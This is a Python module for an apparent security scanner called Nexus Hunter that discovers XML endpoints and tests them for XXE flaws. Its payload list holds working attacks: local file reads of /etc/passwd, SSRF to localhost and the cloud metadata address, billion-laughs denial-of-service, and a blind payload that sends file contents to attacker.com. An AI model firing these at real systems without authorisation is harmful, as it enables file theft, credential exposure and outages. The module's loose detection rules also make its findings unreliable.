"""
XXE Agent for Nexus Hunter  
XML External Entity injection detection and exploitation
"""

import asyncio
import base64
import json
import re
import xml.etree.ElementTree as ET
from typing import Dict, List, Any, Optional, Set
from dataclasses import dataclass

import httpx
from loguru import logger

from agents.base import BaseAgent


@dataclass
class XXEPayload:
    """XXE payload for testing"""
    name: str
    payload: str
    description: str
    category: str
    severity: str
    detection_method: str


class XXEAgent(BaseAgent):
    """Advanced XXE detection and exploitation agent"""
    
    def __init__(self):
        super().__init__("XXEAgent")
        self.xxe_payloads = self._initialize_xxe_payloads()
        self.discovered_vulnerabilities: List[Dict[str, Any]] = []
        self.tested_endpoints: Set[str] = set()
        
        # Safety constraints
        self.max_requests_per_endpoint = 12
        self.request_delay = 1.5
        self.max_concurrent_tests = 2
        
        # Common XML content types
        self.xml_content_types = [
            "application/xml",
            "text/xml", 
            "application/soap+xml",
            "application/xhtml+xml"
        ]
    
    def _initialize_xxe_payloads(self) -> Dict[str, List[XXEPayload]]:
        """Initialize XXE testing payloads"""
        return {
            "file_disclosure": [
                XXEPayload(
                    name="Basic File Disclosure",
                    payload='''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',
                    description="Basic XXE file disclosure attempt",
                    category="File Disclosure",
                    severity="high",
                    detection_method="file_content"
                ),
                XXEPayload(
                    name="Windows File Disclosure",
                    payload='''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<root>&xxe;</root>''',
                    description="Windows file disclosure via XXE",
                    category="File Disclosure",
                    severity="high",
                    detection_method="file_content"
                ),
                XXEPayload(
                    name="Config File Disclosure",
                    payload='''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>''',
                    description="System configuration file disclosure",
                    category="File Disclosure",
                    severity="high",
                    detection_method="file_content"
                )
            ],
            "ssrf_via_xxe": [
                XXEPayload(
                    name="Internal Network Access",
                    payload='''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<root>&xxe;</root>''',
                    description="SSRF via XXE to internal network",
                    category="SSRF via XXE",
                    severity="high",
                    detection_method="response_analysis"
                ),
                XXEPayload(
                    name="Cloud Metadata Access",
                    payload='''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>''',
                    description="AWS metadata access via XXE",
                    category="SSRF via XXE",
                    severity="critical",
                    detection_method="metadata_content"
                ),
                XXEPayload(
                    name="Port Scanning via XXE",
                    payload='''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">
]>
<root>&xxe;</root>''',
                    description="Port scanning via XXE",
                    category="SSRF via XXE",
                    severity="medium",
                    detection_method="response_analysis"
                )
            ],
            "dos_attacks": [
                XXEPayload(
                    name="Billion Laughs Attack",
                    payload='''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>''',
                    description="Billion laughs DoS attack",
                    category="Denial of Service",
                    severity="medium",
                    detection_method="response_time"
                ),
                XXEPayload(
                    name="Quadratic Blowup",
                    payload='''<?xml version="1.0"?>
<!DOCTYPE kaboom [
<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;</kaboom>''',
                    description="Quadratic blowup DoS attack",
                    category="Denial of Service", 
                    severity="medium",
                    detection_method="response_time"
                )
            ],
            "blind_xxe": [
                XXEPayload(
                    name="Blind XXE with External DTD",
                    payload='''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
%ext;
]>
<root>test</root>''',
                    description="Blind XXE using external DTD",
                    category="Blind XXE",
                    severity="high",
                    detection_method="external_request"
                ),
                XXEPayload(
                    name="Blind XXE Parameter Entity",
                    payload='''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
]>
<root>&exfil;</root>''',
                    description="Blind XXE with parameter entity",
                    category="Blind XXE",
                    severity="high", 
                    detection_method="external_request"
                )
            ],
            "encoding_bypass": [
                XXEPayload(
                    name="UTF-16 Encoding Bypass",
                    payload='''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',
                    description="XXE with UTF-16 encoding bypass",
                    category="Filter Bypass",
                    severity="medium",
                    detection_method="file_content"
                ),
                XXEPayload(
                    name="Case Variation Bypass",
                    payload='''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!EntitY xxe SysTeM "file:///etc/passwd">
]>
<root>&xxe;</root>''',
                    description="Case variation bypass attempt",
                    category="Filter Bypass",
                    severity="medium",
                    detection_method="file_content"
                )
            ]
        }
    
    async def execute(self, target: str, config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Main execution method required by BaseAgent"""
        return await self.scan(target, **(config or {}))
    
    async def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Perform comprehensive XXE vulnerability assessment
        
        Args:
            target: Target URL to test for XXE
            **kwargs: Additional scan options
        """
        try:
            results = {
                "target": target,
                "vulnerabilities": [],
                "tested_endpoints": [],
                "xml_endpoints": [],
                "blind_xxe_results": [],
                "statistics": {}
            }
            
            self.logger.info(f"Starting XXE scan for {target}")
            
            # Discover XML endpoints
            xml_endpoints = await self._discover_xml_endpoints(target)
            results["xml_endpoints"] = xml_endpoints
            
            # Test each XML endpoint for XXE
            for endpoint in xml_endpoints:
                vuln_results = await self._test_endpoint_xxe(endpoint, **kwargs)
                if vuln_results:
                    results["vulnerabilities"].extend(vuln_results)
                results["tested_endpoints"].append(endpoint)
            
            # Test for blind XXE if no direct vulnerabilities found
            if not results["vulnerabilities"]:
                blind_results = await self._test_blind_xxe(target, **kwargs)
                results["blind_xxe_results"] = blind_results
            
            # Analyze results
            results = await self._analyze_xxe_results(results)
            
            self.logger.info(f"XXE scan completed for {target}")
            return results
            
        except Exception as e:
            self.logger.error(f"XXE scan failed: {e}")
            return {"error": str(e), "target": target}
    
    async def _discover_xml_endpoints(self, target: str) -> List[Dict[str, Any]]:
        """Discover endpoints that accept XML input"""
        xml_endpoints = []
        
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                # Test main endpoint
                endpoint_info = await self._test_xml_support(client, target)
                if endpoint_info:
                    xml_endpoints.append(endpoint_info)
                
                # Test common API endpoints
                api_paths = [
                    "/api", "/api/v1", "/api/v2", "/soap", "/xml",
                    "/rpc", "/service", "/webservice", "/rest"
                ]
                
                base_url = target.rstrip('/')
                for path in api_paths:
                    test_url = f"{base_url}{path}"
                    endpoint_info = await self._test_xml_support(client, test_url)
                    if endpoint_info:
                        xml_endpoints.append(endpoint_info)
        
        except Exception as e:
            self.logger.error(f"XML endpoint discovery failed: {e}")
        
        return xml_endpoints
    
    async def _test_xml_support(self, client: httpx.AsyncClient, url: str) -> Optional[Dict[str, Any]]:
        """Test if an endpoint supports XML input"""
        try:
            # Test with simple XML
            test_xml = '<?xml version="1.0"?><test>data</test>'
            
            for content_type in self.xml_content_types:
                try:
                    response = await client.post(
                        url,
                        content=test_xml,
                        headers={"Content-Type": content_type}
                    )
                    
                    # Check if endpoint processes XML
                    if (response.status_code not in [404, 405, 415] and 
                        "xml" not in response.text.lower() or 
                        response.status_code in [200, 400, 500]):
                        
                        return {
                            "url": url,
                            "content_type": content_type,
                            "supports_xml": True,
                            "response_code": response.status_code,
                            "method": "POST"
                        }
                
                except Exception:
                    continue
            
            # Also test GET with XML parameter
            try:
                response = await client.get(f"{url}?xml={test_xml}")
                if response.status_code not in [404, 405]:
                    return {
                        "url": url,
                        "supports_xml": True,
                        "response_code": response.status_code,
                        "method": "GET",
                        "parameter": "xml"
                    }
            except Exception:
                pass
        
        except Exception as e:
            self.logger.debug(f"XML support test failed for {url}: {e}")
        
        return None
    
    async def _test_endpoint_xxe(self, endpoint: Dict[str, Any], **kwargs) -> List[Dict[str, Any]]:
        """Test an endpoint for XXE vulnerabilities"""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(timeout=20, verify=False) as client:
                # Test different XXE payload categories
                for category, payloads in self.xxe_payloads.items():
                    # Skip DoS attacks unless explicitly enabled
                    if category == "dos_attacks" and not kwargs.get("include_dos", False):
                        continue
                    
                    for payload in payloads[:2]:  # Limit payloads per category
                        vuln = await self._test_single_xxe_payload(
                            client, endpoint, payload, **kwargs
                        )
                        if vuln:
                            vulnerabilities.append(vuln)
                        
                        # Delay between requests
                        await asyncio.sleep(self.request_delay)
        
        except Exception as e:
            self.logger.error(f"Endpoint XXE testing failed: {e}")
        
        return vulnerabilities
    
    async def _test_single_xxe_payload(self, client: httpx.AsyncClient, endpoint: Dict[str, Any], 
                                     payload: XXEPayload, **kwargs) -> Optional[Dict[str, Any]]:
        """Test a single XXE payload"""
        try:
            # Prepare request
            url = endpoint["url"]
            method = endpoint.get("method", "POST")
            
            start_time = asyncio.get_event_loop().time()
            
            if method == "POST":
                response = await client.post(
                    url,
                    content=payload.payload,
                    headers={
                        "Content-Type": endpoint.get("content_type", "application/xml"),
                        "User-Agent": "Mozilla/5.0 (Security Test)"
                    }
                )
            else:
                # GET with parameter
                param_name = endpoint.get("parameter", "xml")
                response = await client.get(f"{url}?{param_name}={payload.payload}")
            
            end_time = asyncio.get_event_loop().time()
            response_time = end_time - start_time
            
            # Analyze response for XXE indicators
            is_vulnerable, evidence = await self._analyze_xxe_response(response, payload, response_time)
            
            if is_vulnerable:
                return {
                    "endpoint": url,
                    "method": method,
                    "payload": payload.payload,
                    "payload_name": payload.name,
                    "category": payload.category,
                    "severity": payload.severity,
                    "description": payload.description,
                    "evidence": evidence,
                    "status_code": response.status_code,
                    "response_time": response_time,
                    "vulnerability_type": "XXE",
                    "content_type": endpoint.get("content_type", "unknown")
                }
        
        except Exception as e:
            self.logger.debug(f"XXE payload test failed: {e}")
        
        return None
    
    async def _analyze_xxe_response(self, response: httpx.Response, payload: XXEPayload, 
                                  response_time: float) -> tuple[bool, str]:
        """Analyze response for XXE vulnerability indicators"""
        try:
            response_text = response.text.lower()
            evidence_indicators = []
            
            # Check detection method specific indicators
            if payload.detection_method == "file_content":
                file_indicators = [
                    "root:", "bin:", "daemon:", "/etc/passwd", "/etc/shadow",
                    "localhost", "127.0.0.1", "windows", "system32"
                ]
                if any(indicator in response_text for indicator in file_indicators):
                    evidence_indicators.append("Local file content detected in response")
            
            elif payload.detection_method == "metadata_content":
                metadata_indicators = [
                    "instance-id", "ami-id", "security-groups", "meta-data",
                    "user-data", "iam", "credentials", "token"
                ]
                if any(indicator in response_text for indicator in metadata_indicators):
                    evidence_indicators.append("Cloud metadata content detected")
            
            elif payload.detection_method == "response_time":
                # DoS attacks might cause slow responses
                if response_time > 10.0:  # Unusually slow response
                    evidence_indicators.append(f"Unusually slow response: {response_time:.2f}s")
            
            elif payload.detection_method == "response_analysis":
                # Check for error messages or internal service responses
                internal_indicators = [
                    "connection refused", "internal server", "apache", "nginx",
                    "unauthorized", "forbidden", "mysql", "postgresql"
                ]
                if any(indicator in response_text for indicator in internal_indicators):
                    evidence_indicators.append("Internal service response detected")
            
            # General XXE error indicators
            xxe_error_indicators = [
                "entity", "dtd", "external", "xml", "parser", "malformed",
                "entity reference", "external entity", "dtd forbidden"
            ]
            if any(indicator in response_text for indicator in xxe_error_indicators):
                evidence_indicators.append("XXE-related error messages detected")
            
            # Check for unexpected status codes
            if response.status_code in [500, 503] and "xml" in payload.payload.lower():
                evidence_indicators.append("Server error with XML payload")
            
            # Check response size - XXE might cause larger responses
            if len(response.content) > 10000:  # Large response
                evidence_indicators.append("Unusually large response size")
            
            return len(evidence_indicators) > 0, "; ".join(evidence_indicators)
        
        except Exception as e:
            self.logger.debug(f"XXE response analysis failed: {e}")
            return False, ""
    
    async def _test_blind_xxe(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Test for blind XXE vulnerabilities"""
        blind_results = []
        
        try:
            # For blind XXE testing, we would need an external server to receive callbacks
            # This is a simplified version that checks for blind XXE indicators
            
            blind_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % blind SYSTEM "http://nonexistent-domain-xxe-test.com/evil.dtd">
%blind;
]>
<root>test</root>'''
            
            async with httpx.AsyncClient(timeout=15, verify=False) as client:
                try:
                    response = await client.post(
                        target,
                        content=blind_payload,
                        headers={"Content-Type": "application/xml"}
                    )
                    
                    # Check for DNS resolution errors or timeouts
                    if (response.status_code in [500, 502, 503] or 
                        "timeout" in response.text.lower() or
                        "dns" in response.text.lower() or
                        "resolve" in response.text.lower()):
                        
                        blind_results.append({
                            "type": "blind_xxe_indication",
                            "evidence": "Server attempted external entity resolution",
                            "status_code": response.status_code,
                            "potential_blind_xxe": True
                        })
                
                except Exception as e:
                    if "timeout" in str(e).lower() or "resolve" in str(e).lower():
                        blind_results.append({
                            "type": "blind_xxe_indication",
                            "evidence": "Network timeout during external entity resolution",
                            "error": str(e),
                            "potential_blind_xxe": True
                        })
        
        except Exception as e:
            self.logger.error(f"Blind XXE testing failed: {e}")
        
        return blind_results
    
    async def _analyze_xxe_results(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze and categorize XXE scan results"""
        try:
            # Categorize vulnerabilities by severity
            critical_vulns = []
            high_vulns = []
            medium_vulns = []
            low_vulns = []
            
            for vuln in results["vulnerabilities"]:
                severity = vuln.get("severity", "low").lower()
                if severity == "critical":
                    critical_vulns.append(vuln)
                elif severity == "high":
                    high_vulns.append(vuln)
                elif severity == "medium":
                    medium_vulns.append(vuln)
                else:
                    low_vulns.append(vuln)
            
            # Categorize by vulnerability type
            file_disclosure = []
            ssrf_xxe = []
            dos_attacks = []
            blind_xxe = []
            
            for vuln in results["vulnerabilities"]:
                category = vuln.get("category", "").lower()
                if "file disclosure" in category:
                    file_disclosure.append(vuln)
                elif "ssrf" in category:
                    ssrf_xxe.append(vuln)
                elif "denial of service" in category:
                    dos_attacks.append(vuln)
                elif "blind" in category:
                    blind_xxe.append(vuln)
            
            results["categorized_vulnerabilities"] = {
                "critical": critical_vulns,
                "high": high_vulns,
                "medium": medium_vulns,
                "low": low_vulns
            }
            
            results["attack_types"] = {
                "file_disclosure": file_disclosure,
                "ssrf_via_xxe": ssrf_xxe,
                "dos_attacks": dos_attacks,
                "blind_xxe": blind_xxe
            }
            
            results["statistics"] = {
                "total_vulnerabilities": len(results["vulnerabilities"]),
                "critical_count": len(critical_vulns),
                "high_count": len(high_vulns),
                "medium_count": len(medium_vulns),
                "low_count": len(low_vulns),
                "xml_endpoints_found": len(results["xml_endpoints"]),
                "endpoints_tested": len(results["tested_endpoints"]),
                "file_disclosure_count": len(file_disclosure),
                "ssrf_xxe_count": len(ssrf_xxe),
                "blind_xxe_indicators": len(results["blind_xxe_results"])
            }
            
            # Risk assessment
            risk_score = (
                len(critical_vulns) * 4 +
                len(high_vulns) * 3 +
                len(medium_vulns) * 2 +
                len(low_vulns) * 1
            )
            
            results["risk_assessment"] = {
                "risk_score": risk_score,
                "risk_level": self._calculate_risk_level(risk_score),
                "recommendations": self._generate_xxe_recommendations(results)
            }
            
            return results
        
        except Exception as e:
            self.logger.error(f"XXE results analysis failed: {e}")
            return results
    
    def _calculate_risk_level(self, risk_score: int) -> str:
        """Calculate risk level based on score"""
        if risk_score >= 12:
            return "CRITICAL"
        elif risk_score >= 8:
            return "HIGH"
        elif risk_score >= 4:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _generate_xxe_recommendations(self, results: Dict[str, Any]) -> List[str]:
        """Generate XXE-specific security recommendations"""
        recommendations = []
        
        if results["attack_types"]["file_disclosure"]:
            recommendations.append("CRITICAL: Disable external entity processing in XML parsers")
            recommendations.append("HIGH: Implement strict input validation for XML data")
        
        if results["attack_types"]["ssrf_via_xxe"]:
            recommendations.append("CRITICAL: Block external entity resolution to internal networks")
        
        if results["attack_types"]["dos_attacks"]:
            recommendations.append("MEDIUM: Implement limits on XML entity expansion")
        
        if results["statistics"]["total_vulnerabilities"] > 0:
            recommendations.extend([
                "Configure XML parsers to disable external entity processing",
                "Use XML parsers with secure defaults (e.g., defusedxml in Python)",
                "Implement XML schema validation",
                "Sanitize XML input and remove DOCTYPE declarations",
                "Use less complex data formats like JSON when possible",
                "Implement proper error handling to prevent information disclosure"
            ])
        
        if results["blind_xxe_results"]:
            recommendations.append("HIGH: Investigate potential blind XXE vulnerabilities")
        
        return recommendations
    
    def get_vulnerability_types(self) -> List[str]:
        """Get types of XXE vulnerabilities this agent can detect"""
        return [
            "File Disclosure",
            "SSRF via XXE",
            "Denial of Service",
            "Blind XXE",
            "Filter Bypass"
        ]
    
    def get_description(self) -> str:
        """Get agent description"""
        return "Advanced XXE detection agent capable of testing file disclosure, SSRF, DoS attacks, and blind XXE vulnerabilities"

